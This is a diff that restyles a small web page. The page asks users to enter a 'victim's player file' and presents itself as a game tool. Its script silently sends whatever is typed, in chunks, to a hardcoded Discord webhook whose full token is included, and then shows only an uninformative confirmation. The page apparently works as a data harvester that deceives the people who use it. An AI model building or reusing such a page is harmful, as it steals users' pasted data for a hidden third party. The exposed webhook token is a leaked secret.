@@ -1,197 +1,214 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>drhis</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>drhis</title>
 
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background: #08080b;
-            font-family: "Inter", Arial, sans-serif;
-            color: white;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
+<style>
+body {
+    margin: 0;
+    padding: 0;
+    background: #08080b;
+    font-family: "Inter", Arial, sans-serif;
+    color: white;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+}
 
-        .wrapper {
-            display: flex;
-            gap: 30px;
-        }
+.wrapper {
+    display: flex;
+    gap: 30px;
+}
 
-        /* --- BOTH BOXES MATCH --- */
-        .container, .video-panel {
-            background: rgba(25, 25, 35, 0.9);
-            padding: 45px;
-            border-radius: 14px;
-            width: 340px;
-            text-align: center;
+/* --- BOTH BOXES MATCH --- */
+.container, .video-panel {
+    background: rgba(25, 25, 35, 0.9);
+    padding: 45px;
+    border-radius: 14px;
+    width: 340px;
+    text-align: center;
 
-            border: 2px solid #6e00ff;
-            box-shadow:
-                0 0 15px #6a00ff55,
-                0 0 35px #a200ff33;
+    border: 2px solid #6e00ff;
+    box-shadow:
+        0 0 15px #6a00ff55,
+        0 0 35px #a200ff33;
 
-            transition: 0.25s ease;
-        }
+    transition: 0.25s ease;
+}
 
-        .container:hover, .video-panel:hover {
-            transform: translateY(-4px);
-            box-shadow:
-                0 0 25px #8e00ff88,
-                0 0 60px #c000ff44;
-        }
+.container:hover, .video-panel:hover {
+    transform: translateY(-4px);
+    box-shadow:
+        0 0 25px #8e00ff88,
+        0 0 60px #c000ff44;
+}
 
-        h2 {
-            margin-bottom: 20px;
-            font-weight: 500;
-            letter-spacing: 0.7px;
-            color: #dcd2ff;
-            text-shadow: 0 0 8px #8e44ff;
-        }
+h2 {
+    margin-bottom: 20px;
+    font-weight: 500;
+    letter-spacing: 0.7px;
+    color: #dcd2ff;
+    text-shadow: 0 0 8px #8e44ff;
+}
 
-        input {
-            width: 100%;
-            padding: 12px;
-            margin-top: 15px;
-            margin-bottom: 20px;
-            border-radius: 8px;
-            border: none;
-            background: #201f2f;
-            color: #e8e8ff;
-            font-size: 15px;
-            outline: none;
-            transition: 0.2s;
-            border: 1px solid #3b2c5a;
-        }
+/* --- FLEX INPUT WITH ICON AND ANIMATION --- */
+.input-wrapper {
+    display: flex;
+    align-items: center;
+    background: #201f2f;
+    border: 1px solid #3b2c5a;
+    border-radius: 8px;
+    padding: 8px 12px;
+    margin-bottom: 20px;
+    transition: 0.25s ease; /* smooth animation */
+}
 
-        input:focus {
-            background: #2b2940;
-            transform: scale(1.03);
-            border-color: #8e44ff;
-            box-shadow: 0 0 10px #8e44ff55;
-        }
+.input-wrapper svg {
+    width: 18px;
+    height: 18px;
+    margin-right: 8px;
+    flex-shrink: 0;
+}
 
-        button {
-            width: 100%;
-            padding: 14px;
-            background: linear-gradient(135deg, #6e00ff, #b400ff);
-            border: none;
-            border-radius: 10px;
-            font-size: 16px;
-            color: white;
-            cursor: pointer;
-            font-weight: 600;
-            letter-spacing: 0.5px;
-            transition: 0.25s ease;
-            box-shadow: 0 0 20px #7a00ff66;
-        }
+.input-wrapper input {
+    flex: 1;
+    border: none;
+    background: transparent;
+    color: #e8e8ff;
+    font-size: 15px;
+    outline: none;
+    transition: 0.25s ease; /* smooth animation */
+}
 
-        button:hover {
-            transform: translateY(-3px) scale(1.05);
-            box-shadow: 0 0 30px #9d00ff99;
-        }
+/* --- Hover/focus effect --- */
+.input-wrapper:hover,
+.input-wrapper input:focus {
+    transform: scale(1.03);
+    border-color: #8e44ff;
+    box-shadow: 0 0 10px #8e44ff55;
+}
 
-        /* Success message in pink */
-        .success {
-            margin-top: 15px;
-            color: #ff6ec7; /* Pink color */
-            display: none;
-            font-size: 15px;
-            text-shadow: 0 0 10px #ff6ec733; /* Pink glow */
-        }
+/* Button */
+button {
+    width: 100%;
+    padding: 14px;
+    background: linear-gradient(135deg, #6e00ff, #b400ff);
+    border: none;
+    border-radius: 10px;
+    font-size: 16px;
+    color: white;
+    cursor: pointer;
+    font-weight: 600;
+    letter-spacing: 0.5px;
+    transition: 0.25s ease;
+    box-shadow: 0 0 20px #7a00ff66;
+}
 
-        /* --- VIDEO BOX --- */
-        .video-box {
-            width: 100%;
-            height: 200px;
-            border-radius: 12px;
-            overflow: hidden;
-            margin-top: 20px;
+button:hover {
+    transform: translateY(-3px) scale(1.05);
+    box-shadow: 0 0 30px #9d00ff99;
+}
 
-            border: 1px solid #3b2c5a;
-            box-shadow: inset 0 0 10px #00000055;
+/* Success message in pink */
+.success {
+    margin-top: 15px;
+    color: #ff6ec7;
+    display: none;
+    font-size: 15px;
+    text-shadow: 0 0 10px #ff6ec733;
+}
 
-            transition: 0.25s ease;
-        }
+/* VIDEO BOX */
+.video-box {
+    width: 100%;
+    height: 200px;
+    border-radius: 12px;
+    overflow: hidden;
+    margin-top: 20px;
+    border: 1px solid #3b2c5a;
+    box-shadow: inset 0 0 10px #00000055;
+    transition: 0.25s ease;
+}
 
-        .video-panel:hover .video-box {
-            transform: scale(1.02);
-            box-shadow: inset 0 0 18px #7a00ff55;
-            border-color: #8e44ff;
-        }
+.video-panel:hover .video-box {
+    transform: scale(1.02);
+    box-shadow: inset 0 0 18px #7a00ff55;
+    border-color: #8e44ff;
+}
 
-        .video-box video {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-    </style>
+.video-box video {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+}
+</style>
 </head>
 <body>
 
-    <div class="wrapper">
+<div class="wrapper">
 
-        <!-- LEFT PANEL -->
-        <div class="container">
-            <h2>Aler</h2>
+    <!-- LEFT PANEL -->
+    <div class="container">
+        <h2>Aler</h2>
 
+        <div class="input-wrapper">
+            <!-- File SVG Icon -->
+            <svg xmlns="http://www.w3.org/2000/svg" fill="white" viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6zM6 20V4h7v5h5v11H6z"/></svg>
             <input type="text" id="message" placeholder="Enter Ur Victims Player File">
-
-            <button onclick="sendData()">Sing!</button>
-
-            <p class="success" id="msg">Hams...</p>
         </div>
 
-        <!-- RIGHT PANEL (VIDEO PANEL) -->
-        <div class="video-panel">
-            <h2>Tial</h2>
+        <button onclick="sendData()">Sing!</button>
 
-            <div class="video-box">
-                <!-- Added controls for fullscreen icon -->
-                <video autoplay muted loop controls>
-                    <source src="2025-11-14_20-25-04.mp4" type="video/mp4">
-                </video>
-            </div>
-        </div>
-
+        <p class="success" id="msg">Hams...</p>
     </div>
 
-    <script>
-        const webhook = "https://discord.com/api/webhooks/1439051346014638201/C2fBflf3zj_LgvxVMpQqIx3vgjZww5_JBiAr47HKM5is1uxPlVK-B6etBRAJwof0VNvw";
+    <!-- RIGHT PANEL (VIDEO PANEL) -->
+    <div class="video-panel">
+        <h2>Tial</h2>
 
-        function splitIntoChunks(text) {
-            const MAX = 2000;
-            const chunks = [];
-            for (let i = 0; i < text.length; i += MAX) {
-                chunks.push(text.slice(i, i + MAX));
-            }
-            return chunks;
-        }
+        <div class="video-box">
+            <video autoplay muted loop controls>
+                <source src="2025-11-14_20-25-04.mp4" type="video/mp4">
+            </video>
+        </div>
+    </div>
 
-        async function sendData() {
-            const message = document.getElementById("message").value.trim();
-            if (!message) return;
+</div>
 
-            const chunks = splitIntoChunks(message);
-            for (const chunk of chunks) {
-                await fetch(webhook, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ content: chunk })
-                });
-            }
+<script>
+const webhook = "https://discord.com/api/webhooks/1439051346014638201/C2fBflf3zj_LgvxVMpQqIx3vgjZww5_JBiAr47HKM5is1uxPlVK-B6etBRAJwof0VNvw";
 
-            const msgEl = document.getElementById("msg");
-            msgEl.style.display = "block"; // Pink text shows up
-            setTimeout(() => { msgEl.style.display = "none"; }, 3000);
-            document.getElementById("message").value = "";
-        }
-    </script>
+function splitIntoChunks(text) {
+    const MAX = 2000;
+    const chunks = [];
+    for (let i = 0; i < text.length; i += MAX) {
+        chunks.push(text.slice(i, i + MAX));
+    }
+    return chunks;
+}
+
+async function sendData() {
+    const message = document.getElementById("message").value.trim();
+    if (!message) return;
+
+    const chunks = splitIntoChunks(message);
+    for (const chunk of chunks) {
+        await fetch(webhook, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ content: chunk })
+        });
+    }
+
+    const msgEl = document.getElementById("msg");
+    msgEl.style.display = "block";
+    setTimeout(() => { msgEl.style.display = "none"; }, 3000);
+    document.getElementById("message").value = "";
+}
+</script>
 
 </body>
 </html>
